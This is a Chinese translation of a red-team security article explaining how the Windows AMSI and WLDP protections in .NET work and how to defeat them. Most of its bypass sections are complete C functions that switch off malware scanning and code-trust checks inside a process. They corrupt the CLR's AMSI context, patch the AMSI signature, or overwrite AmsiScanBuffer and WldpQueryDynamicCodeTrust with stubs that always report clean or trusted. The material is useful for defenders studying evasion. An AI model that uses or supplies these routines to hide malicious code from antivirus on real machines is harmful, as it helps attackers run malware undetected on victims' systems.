> 原文链接: https://www.anquanke.com//post/id/179832 


# 如何绕过AMSI及WLDP


                                阅读量   
                                **247208**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者modexp，文章来源：modexp.wordpress.com
                                <br>原文地址：[https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/](https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01b5206026dfb6d46b.png)](https://p0.ssl.qhimg.com/t01b5206026dfb6d46b.png)



## 0x00 前言

.NET Framework在[v4.8](https://devblogs.microsoft.com/dotnet/announcing-the-net-framework-4-8/)版中使用[Antimalware Scan Interface (AMSI)](https://docs.microsoft.com/en-us/windows/desktop/amsi/antimalware-scan-interface-portal)以及[Windows Lockdown Policy (WLDP)](https://docs.microsoft.com/en-us/windows/desktop/devnotes/windows-lockdown-policy)机制来阻止攻击者从内存中运行潜在风险的软件。WLDP会验证动态代码的数字签名，而AMSI会扫描有害或者被管理员阻止运行的软件。本文介绍了红队用来绕过AMSI的3种常用方法，也介绍了能绕过WLDP的一种方法。这里介绍的绕过方法较为通用，不需要掌握关于AMSI或者WLDP的特殊知识点。在2019年6月之后这些方法可能没那么好好用。我们与[TheWover](https://twitter.com/TheRealWover)一起合作，共同研究关于AMSI及WLDP的相关技术。



## 0x01 已有研究成果

关于AMSI及WLDP之前已经有一些研究成果，如下表所示。如果大家还掌握更多资料，可以随时给我发邮件更新。

<th style="text-align: left;">时间</th><th style="text-align: left;">w文章</th>
|------
<td style="text-align: left;">2016年5月</td><td style="text-align: left;">[Bypassing Amsi using PowerShell 5 DLL Hijacking](http://cn33liz.blogspot.com/2016/05/bypassing-amsi-using-powershell-5-dll.html) by [Cneelis](https://twitter.com/cneelis)</td>
<td style="text-align: left;">2017年7月</td><td style="text-align: left;">[Bypassing AMSI via COM Server Hijacking](https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/) by [Matt Nelson](https://twitter.com/enigma0x3)</td>
<td style="text-align: left;">2017年7月</td><td style="text-align: left;">[Bypassing Device Guard with .NET Assembly Compilation Methods](http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html) by [Matt Graeber](https://twitter.com/mattifestation)</td>
<td style="text-align: left;">2018年2月</td><td style="text-align: left;">[AMSI Bypass With a Null Character](http://standa-note.blogspot.com/2018/02/amsi-bypass-with-null-character.html) by [Satoshi Tanda](https://twitter.com/standa_t)</td>
<td style="text-align: left;">2018年2月</td><td style="text-align: left;">[AMSI Bypass: Patching Technique](https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/) by CyberArk (Avi Gimpel and Zeev Ben Porat).</td>
<td style="text-align: left;">2018年2月</td><td style="text-align: left;">[The Rise and Fall of AMSI](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf) by [Tal Liberman](https://twitter.com/Tal_Liberman) (Ensilo).</td>
<td style="text-align: left;">2018年5月</td><td style="text-align: left;">[AMSI Bypass Redux](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/) by Avi Gimpel (CyberArk).</td>
<td style="text-align: left;">2018年6月</td><td style="text-align: left;">[Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/) by [Adam Chester](https://twitter.com/_xpn_)</td>
<td style="text-align: left;">2018年6月</td><td style="text-align: left;">[Disabling AMSI in JScript with One Simple Trick](https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html) by [James Forshaw](https://twitter.com/tiraniddo)</td>
<td style="text-align: left;">2018年6月</td><td style="text-align: left;">[Documenting and Attacking a Windows Defender Application Control Feature the Hard Way](https://posts.specterops.io/documenting-and-attacking-a-windows-defender-application-control-feature-the-hard-way-a-case-73dd1e11be3a) – A Case Study in Security Research Methodology by [Matt Graeber](https://twitter.com/mattifestation)</td>
<td style="text-align: left;">2018年10月</td><td style="text-align: left;">[How to bypass AMSI and execute ANY malicious Powershell code](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html) by [Andre Marques](https://twitter.com/_zc00l)</td>
<td style="text-align: left;">2018年10月</td><td style="text-align: left;">AmsiScanBuffer Bypass [Part 1](https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/), [Part 2](https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/), [Part 3](https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/), [Part 4](https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/) by [Rasta Mouse](https://twitter.com/_RastaMouse)</td>
<td style="text-align: left;">2018年12月</td><td style="text-align: left;">[PoC function to corrupt the g_amsiContext global variable in clr.dll](https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9) by [Matt Graeber](https://twitter.com/mattifestation)</td>
<td style="text-align: left;">2019年4月</td><td style="text-align: left;">[Bypassing AMSI for VBA](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/) by [Pieter Ceelen](https://twitter.com/ptrpieter) (Outflank)</td>



## 0x02 AMSI示例代码

在给定文件路径的情况下，如下代码可以打开该文件，将其映射到内存中然后使用AMSI来检测文件内容是否有害，或者是否被管理员所阻止：

```
typedef HRESULT (WINAPI *AmsiInitialize_t)(
  LPCWSTR      appName,
  HAMSICONTEXT *amsiContext);

typedef HRESULT (WINAPI *AmsiScanBuffer_t)(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result);

typedef void (WINAPI *AmsiUninitialize_t)(
  HAMSICONTEXT amsiContext);

BOOL IsMalware(const char *path) `{`
    AmsiInitialize_t   _AmsiInitialize;
    AmsiScanBuffer_t   _AmsiScanBuffer;
    AmsiUninitialize_t _AmsiUninitialize;
    HAMSICONTEXT       ctx;
    AMSI_RESULT        res;
    HMODULE            amsi;

    HANDLE             file, map, mem;
    HRESULT            hr = -1;
    DWORD              size, high;
    BOOL               malware = FALSE;

    // load amsi library
    amsi = LoadLibrary("amsi");

    // resolve functions
    _AmsiInitialize = 
      (AmsiInitialize_t)
      GetProcAddress(amsi, "AmsiInitialize");

    _AmsiScanBuffer =
      (AmsiScanBuffer_t)
      GetProcAddress(amsi, "AmsiScanBuffer");

    _AmsiUninitialize = 
      (AmsiUninitialize_t)
      GetProcAddress(amsi, "AmsiUninitialize");

    // return FALSE on failure
    if(_AmsiInitialize   == NULL ||
       _AmsiScanBuffer   == NULL ||
       _AmsiUninitialize == NULL) `{`
      printf("Unable to resolve AMSI functions.n");
      return FALSE;
    `}`

    // open file for reading
    file = CreateFile(
      path, GENERIC_READ, FILE_SHARE_READ,
      NULL, OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, NULL); 

    if(file != INVALID_HANDLE_VALUE) `{`
      // get size
      size = GetFileSize(file, &amp;high);
      if(size != 0) `{`
        // create mapping
        map = CreateFileMapping(
          file, NULL, PAGE_READONLY, 0, 0, 0);

        if(map != NULL) `{`
          // get pointer to memory
          mem = MapViewOfFile(
            map, FILE_MAP_READ, 0, 0, 0);

          if(mem != NULL) `{`
            // scan for malware
            hr = _AmsiInitialize(L"AMSI Example", &amp;ctx);
            if(hr == S_OK) `{`
              hr = _AmsiScanBuffer(ctx, mem, size, NULL, 0, &amp;res);
              if(hr == S_OK) `{`
                malware = (AmsiResultIsMalware(res) || 
                           AmsiResultIsBlockedByAdmin(res));
              `}`
              _AmsiUninitialize(ctx);
            `}`              
            UnmapViewOfFile(mem);
          `}`
          CloseHandle(map);
        `}`
      `}`
      CloseHandle(file);
    `}`
    return malware;
`}`
```

扫描正常文件和[有害](https://github.com/GhostPack/SafetyKatz)文件的结果如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b1e37a64baf5087b.png)

如果大家对AMSI的内部工作原理已经非常熟悉，可以直接跳到下文的绕过方法部分内容。



## 0x03 AMSI上下文

AMSI上下文结构是一个非公开的结构，但我们可以使用如下结构来解析返回的句柄。

```
typedef struct tagHAMSICONTEXT `{`
  DWORD        Signature;          // "AMSI" or 0x49534D41
  PWCHAR       AppName;            // set by AmsiInitialize
  IAntimalware *Antimalware;       // set by AmsiInitialize
  DWORD        SessionCount;       // increased by AmsiOpenSession
`}` _HAMSICONTEXT, *_PHAMSICONTEXT;
```



## 0x04 AMSI初始化

在初始化函数参数中，`appName`指向的是用户定义的一个`unicode`字符串，而`amsiContext`指向的是`HAMSICONTEXT`类型的一个句柄。如果成功初始化AMSI上下文，该函数就会返回`S_OK`。如下代码并非完整版的初始化函数代码，但可以帮助我们理解AMSI的内部工作流程。

```
HRESULT _AmsiInitialize(LPCWSTR appName, HAMSICONTEXT *amsiContext) `{`
    _HAMSICONTEXT *ctx;
    HRESULT       hr;
    int           nameLen;
    IClassFactory *clsFactory = NULL;

    // invalid arguments?
    if(appName == NULL || amsiContext == NULL) `{`
      return E_INVALIDARG;
    `}`

    // allocate memory for context
    ctx = (_HAMSICONTEXT*)CoTaskMemAlloc(sizeof(_HAMSICONTEXT));
    if(ctx == NULL) `{`
      return E_OUTOFMEMORY;
    `}`

    // initialize to zero
    ZeroMemory(ctx, sizeof(_HAMSICONTEXT));

    // set the signature to "AMSI"
    ctx-&gt;Signature = 0x49534D41;

    // allocate memory for the appName and copy to buffer
    nameLen = (lstrlen(appName) + 1) * sizeof(WCHAR);
    ctx-&gt;AppName = (PWCHAR)CoTaskMemAlloc(nameLen);

    if(ctx-&gt;AppName == NULL) `{`
      hr = E_OUTOFMEMORY;
    `}` else `{`
      // set the app name
      lstrcpy(ctx-&gt;AppName, appName);

      // instantiate class factory
      hr = DllGetClassObject(
        CLSID_Antimalware, 
        IID_IClassFactory, 
        (LPVOID*)&amp;clsFactory);

      if(hr == S_OK) `{`
        // instantiate Antimalware interface
        hr = clsFactory-&gt;CreateInstance(
          NULL,
          IID_IAntimalware, 
          (LPVOID*)&amp;ctx-&gt;Antimalware);

        // free class factory
        clsFactory-&gt;Release();

        // save pointer to context
        *amsiContext = ctx;
      `}`
    `}`

    // if anything failed, free context
    if(hr != S_OK) `{`
      AmsiFreeContext(ctx);
    `}`
    return hr;
`}`
```

`HAMSICONTEXT`结构对应的内存在堆上分配，并且使用`appName`、AMSI对应的“签名”（即`0x49534D41`）和[`IAntimalware`](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nn-amsi-iantimalware)接口进行初始化。



## 0x05 AMSI扫描

我们可以通过如下代码，大致了解当该函数被调用时会执行哪些操作。如果扫描成功，返回结果为`S_OK`，我们需要检查[`AMSI_RESULT`](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/ne-amsi-amsi_result)，判断`buffer`中是否包含不需要的软件。

```
HRESULT _AmsiScanBuffer(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result)
`{`
    _HAMSICONTEXT *ctx = (_HAMSICONTEXT*)amsiContext;

    // validate arguments
    if(buffer           == NULL       ||
       length           == 0          ||
       amsiResult       == NULL       ||
       ctx              == NULL       ||
       ctx-&gt;Signature   != 0x49534D41 ||
       ctx-&gt;AppName     == NULL       ||
       ctx-&gt;Antimalware == NULL)
    `{`
      return E_INVALIDARG;
    `}`

    // scan buffer
    return ctx-&gt;Antimalware-&gt;Scan(
      ctx-&gt;Antimalware,     // rcx = this
      &amp;CAmsiBufferStream,   // rdx = IAmsiBufferStream interface
      amsiResult,           // r8  = AMSI_RESULT
      NULL,                 // r9  = IAntimalwareProvider
      amsiContext,          // HAMSICONTEXT
      CAmsiBufferStream,
      buffer,
      length, 
      contentName,
      amsiSession);
`}`
```

注意观察上面对参数的验证过程，我们可以以此为基础，让`AmsiScanBuffer`失败，返回`E_INVALIDARG`。



## 0x06 AMSI的CLR实现

CLR使用了名为`AmsiScan`的一个私有函数来检测通过`Load`方法传递的软件是否为潜在风险软件。根据检测结果，系统可能会结束某个.NET进程的运行（但不一定是使用CLR托管接口的非托管（unmanaged）进程）。我们可以通过如下代码大致了解CLR如何实现AMSI。

```
AmsiScanBuffer_t _AmsiScanBuffer;
AmsiInitialize_t _AmsiInitialize;
HAMSICONTEXT     *g_amsiContext;

VOID AmsiScan(PVOID buffer, ULONG length) `{`
    HMODULE          amsi;
    HAMSICONTEXT     *ctx;
    HAMSI_RESULT     amsiResult;
    HRESULT          hr;

    // if global context not initialized
    if(g_amsiContext == NULL) `{`
      // load AMSI.dll
      amsi = LoadLibraryEx(
        L"amsi.dll", 
        NULL, 
        LOAD_LIBRARY_SEARCH_SYSTEM32);

      if(amsi != NULL) `{`
        // resolve address of init function
        _AmsiInitialize = 
          (AmsiInitialize_t)GetProcAddress(amsi, "AmsiInitialize");

        // resolve address of scanning function
        _AmsiScanBuffer =
          (AmsiScanBuffer_t)GetProcAddress(amsi, "AmsiScanBuffer");

        // failed to resolve either? exit scan
        if(_AmsiInitialize == NULL ||
           _AmsiScanBuffer == NULL) return;

        hr = _AmsiInitialize(L"DotNet", &amp;ctx);

        if(hr == S_OK) `{`
          // update global variable
          g_amsiContext = ctx;
        `}`
      `}`
    `}`
    if(g_amsiContext != NULL) `{`
      // scan buffer
      hr = _AmsiScanBuffer(
        g_amsiContext,
        buffer,
        length,
        0,
        0,        
        &amp;amsiResult);

      if(hr == S_OK) `{`
        // if malware was detected or it's blocked by admin
        if(AmsiResultIsMalware(amsiResult) ||
           AmsiResultIsBlockedByAdmin(amsiResult))
        `{`
          // "Operation did not complete successfully because "
          // "the file contains a virus or potentially unwanted" 
          // software.
          GetHRMsg(ERROR_VIRUS_INFECTED, &amp;error_string, 0);
          ThrowHR(COR_E_BADIMAGEFORMAT, &amp;error_string);          
        `}`           
      `}`
    `}`
`}`
```

CLR使用了名为`g_amsiContext`的一个全局变量，该变量指向的是由`AmsiInitialize`创建的AMSI上下文（当首次使用`AmsiScan`时）。如果`AMSI`上下文结构被破坏，`AmsiScan`并不会抛出任何错误，这是否是个问题值得商榷。如果`AmsiScanBuffer`返回`S_OK`，只有此时才会检查`amsiResult`。如果`buffer`中包含恶意代码，就会使用`COR_E_BADIMAGEFORMAT`以及`ERROR_VIRUS_INFECTED`错误信息来调用`ThrowHR`。然而，如果向`AmsiScanBuffer`传递了格式错误的上下文，那么该函数就会返回`E_INVALIDARG`，并且`buffer`中的内容永远不会被检查。此外，`AmsiScan`并不会去调查为什么`AmsiScanBuffer`会出现错误。这里应该问一个问题：“如果系统支持AMSI且调用失败了，背后的原因到底是什么？”



## 0x07 AMSI绕过：Patch数据

Matt Graeber提供了一个PoC，可以破坏`CLR!g_amsiContext`所指向的上下文，这样将导致`AmsiScanBuffer`返回`E_INVALIDARG`。从CLR的实现代码中可知，由于系统永远不会验证`CLR!AmsiScan`的结果是否成功或者失败，因此这种方法行之有效。我们认为系统会简单抛出一个错误，终止尝试加载恶意软件的宿主应用，然而，托管.NET程序集的非托管应用可能会处理任何C++异常。Windows Defender仍然会记录检测到有害代码的行为，但非托管宿主应用在某些情况下仍然可以继续运行。为了通过`g_amsiContext`禁用AMSI，我们可以搜索`PEB.ProcessHeap`所指向的堆内存，或者搜索`.data`段虚拟地址空间中找到的每个指针。后一种方法可以参考如下代码，只有当CLR调用`AmsiScan`后这种方法才有效。

```
BOOL DisableAMSI(VOID) `{`
    LPVOID                   hCLR;
    BOOL                     disabled = FALSE;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, j, res;
    PBYTE                    ds;
    MEMORY_BASIC_INFORMATION mbi;
    _PHAMSICONTEXT           ctx;

    hCLR = GetModuleHandleA("CLR");

    if(hCLR != NULL) `{`
      dos = (PIMAGE_DOS_HEADER)hCLR;  
      nt  = RVA2VA(PIMAGE_NT_HEADERS, hCLR, dos-&gt;e_lfanew);  
      sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&amp;nt-&gt;OptionalHeader + 
             nt-&gt;FileHeader.SizeOfOptionalHeader);

      // scan all writeable segments while disabled == FALSE
      for(i = 0; 
          i &lt; nt-&gt;FileHeader.NumberOfSections &amp;&amp; !disabled; 
          i++) 
      `{`
        // if this section is writeable, assume it's data
        if (sh[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE) `{`
          // scan section for pointers to the heap
          ds = RVA2VA (PBYTE, hCLR, sh[i].VirtualAddress);

          for(j = 0; 
              j &lt; sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
              j += sizeof(ULONG_PTR)) 
          `{`
            // get pointer
            ULONG_PTR ptr = *(ULONG_PTR*)&amp;ds[j];
            // query if the pointer
            res = VirtualQuery((LPVOID)ptr, &amp;mbi, sizeof(mbi));
            if(res != sizeof(mbi)) continue;

            // if it's a pointer to heap or stack
            if ((mbi.State   == MEM_COMMIT    ) &amp;&amp;
                (mbi.Type    == MEM_PRIVATE   ) &amp;&amp; 
                (mbi.Protect == PAGE_READWRITE))
            `{`
              ctx = (_PHAMSICONTEXT)ptr;
              // check if it contains the signature 
              if(ctx-&gt;Signature == 0x49534D41) `{`
                // corrupt it
                ctx-&gt;Signature++;
                disabled = TRUE;
                break;
              `}`
            `}`
          `}`
        `}`
      `}`
    `}`
    return disabled;
`}`
```



## 0x08 AMSI绕过：Patch代码（1）

CyberArk建议通过两条指令（ `xor edi, edi, nop`）来patch `AmsiScanBuffer`。如果我们想hook该函数，那么在跳转到其他函数之前，可以使用LDE（Length Disassembler Engine）来计算待保存的prolog字节数。由于该函数会验证传递进来的的AMSI上下文参数，并且要求Signature值为“AMSI”，因此我们可以定位这个值，简单将其更改为其他值即可。与Matt Graeber破坏上下文/数据的方法不同，在如下代码中我们会破坏这个特征值来绕过AMSI。

```
BOOL DisableAMSI(VOID) `{`
    HMODULE        dll;
    PBYTE          cs;
    DWORD          i, op, t;
    BOOL           disabled = FALSE;
    _PHAMSICONTEXT ctx;

    // load AMSI library
    dll = LoadLibraryExA(
      "amsi", NULL, 
      LOAD_LIBRARY_SEARCH_SYSTEM32);

    if(dll == NULL) `{`
      return FALSE;
    `}`
    // resolve address of function to patch
    cs = (PBYTE)GetProcAddress(dll, "AmsiScanBuffer");

    // scan for signature
    for(i=0;;i++) `{`
      ctx = (_PHAMSICONTEXT)&amp;cs[i];
      // is it "AMSI"?
      if(ctx-&gt;Signature == 0x49534D41) `{`
        // set page protection for write access
        VirtualProtect(cs, sizeof(ULONG_PTR), 
          PAGE_EXECUTE_READWRITE, &amp;op);

        // change signature
        ctx-&gt;Signature++;

        // set page back to original protection
        VirtualProtect(cs, sizeof(ULONG_PTR), op, &amp;t);
        disabled = TRUE;
        break;
      `}`
    `}`
    return disabled;
`}`
```



## 0x09 AMSI绕过：Patch代码（2）

Tal Liberman的建议是覆盖`AmsiScanBuffer`的prolog字节，使该函数返回1。如下代码会覆盖该函数，使得当CLR扫描任何缓冲区时，该函数都会返回`AMSI_RESULT_CLEAN`以及`S_OK`。

```
// fake function that always returns S_OK and AMSI_RESULT_CLEAN
static HRESULT AmsiScanBufferStub(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result)
`{`
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
`}`

static VOID AmsiScanBufferStubEnd(VOID) `{``}`

BOOL DisableAMSI(VOID) `{`
    BOOL    disabled = FALSE;
    HMODULE amsi;
    DWORD   len, op, t;
    LPVOID  cs;

    // load amsi
    amsi = LoadLibrary("amsi");

    if(amsi != NULL) `{`
      // resolve address of function to patch
      cs = GetProcAddress(amsi, "AmsiScanBuffer");

      if(cs != NULL) `{`
        // calculate length of stub
        len = (ULONG_PTR)AmsiScanBufferStubEnd -
          (ULONG_PTR)AmsiScanBufferStub;

        // make the memory writeable
        if(VirtualProtect(
          cs, len, PAGE_EXECUTE_READWRITE, &amp;op))
        `{`
          // over write with code stub
          memcpy(cs, &amp;AmsiScanBufferStub, len);

          disabled = TRUE;

          // set back to original protection
          VirtualProtect(cs, len, op, &amp;t);
        `}`
      `}`
    `}`
    return disabled;
`}`
```

patch之后，恶意软件会被标记为安全软件，如下图所示：

[![](https://p0.ssl.qhimg.com/t019eb6933337d5aba4.png)](https://p0.ssl.qhimg.com/t019eb6933337d5aba4.png)



## 0x0A WLDP示例代码

如下函数演示了如何使用WLDP（Windows Lockdown Policy）来查询内存中的动态代码是否可信。

```
BOOL VerifyCodeTrust(const char *path) `{`
    WldpQueryDynamicCodeTrust_t _WldpQueryDynamicCodeTrust;
    HMODULE                     wldp;
    HANDLE                      file, map, mem;
    HRESULT                     hr = -1;
    DWORD                       low, high;

    // load wldp
    wldp = LoadLibrary("wldp");
    _WldpQueryDynamicCodeTrust = 
      (WldpQueryDynamicCodeTrust_t)
      GetProcAddress(wldp, "WldpQueryDynamicCodeTrust");

    // return FALSE on failure
    if(_WldpQueryDynamicCodeTrust == NULL) `{`
      printf("Unable to resolve address for WLDP.dll!WldpQueryDynamicCodeTrust.n");
      return FALSE;
    `}`

    // open file reading
    file = CreateFile(
      path, GENERIC_READ, FILE_SHARE_READ,
      NULL, OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, NULL); 

    if(file != INVALID_HANDLE_VALUE) `{`
      // get size
      low = GetFileSize(file, &amp;high);
      if(low != 0) `{`
        // create mapping
        map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, 0);
        if(map != NULL) `{`
          // get pointer to memory
          mem = MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
          if(mem != NULL) `{`
            // verify signature
            hr = _WldpQueryDynamicCodeTrust(0, mem, low);              
            UnmapViewOfFile(mem);
          `}`
          CloseHandle(map);
        `}`
      `}`
      CloseHandle(file);
    `}`
    return hr == S_OK;
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01038852eac7736eea.png)



## 0x0B WLDP绕过：Patch代码

我们可以使用桩（stub）代码来覆盖该函数，始终返回`S_OK`。

```
// fake function that always returns S_OK
static HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
    HANDLE fileHandle,
    PVOID  baseImage,
    ULONG  ImageSize)
`{`
    return S_OK;
`}`

static VOID WldpQueryDynamicCodeTrustStubEnd(VOID) `{``}`

static BOOL PatchWldp(VOID) `{`
    BOOL    patched = FALSE;
    HMODULE wldp;
    DWORD   len, op, t;
    LPVOID  cs;

    // load wldp
    wldp = LoadLibrary("wldp");

    if(wldp != NULL) `{`
      // resolve address of function to patch
      cs = GetProcAddress(wldp, "WldpQueryDynamicCodeTrust");

      if(cs != NULL) `{`
        // calculate length of stub
        len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;

        // make the memory writeable
        if(VirtualProtect(
          cs, len, PAGE_EXECUTE_READWRITE, &amp;op))
        `{`
          // over write with stub
          memcpy(cs, &amp;WldpQueryDynamicCodeTrustStub, len);

          patched = TRUE;

          // set back to original protection
          VirtualProtect(cs, len, op, &amp;t);
        `}`
      `}`
    `}`
    return patched;
`}`
```

[![](https://p1.ssl.qhimg.com/t016ef16b323fea7fad.png)](https://p1.ssl.qhimg.com/t016ef16b323fea7fad.png)

虽然本文介绍的方法检测起来非常容易，但对于Windows 10上最新版的DotNet Framework来说依然有效。只要我们还可以patch AMSI用来检测有害代码的数据或者代码，那么绕过AMSI的方法就一直都会存在。
